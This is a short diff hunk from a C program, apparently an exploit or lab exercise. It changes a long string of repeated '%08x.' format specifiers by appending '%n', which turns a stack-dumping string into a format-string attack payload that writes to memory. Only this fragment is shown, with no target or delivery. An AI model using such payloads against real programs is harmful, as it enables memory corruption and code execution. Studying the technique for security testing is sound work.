@@ -22,7 +22,7 @@ int main(){
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
-			"%08x.%08x.%08x.%08x.";
+			"%08x.%08x.%08x.%08x.%n";
 	char* cmd = (char*)malloc(1000);
 	p_cmd_len = strlen(p_cmd);
 	strcpy(cmd, p_cmd);
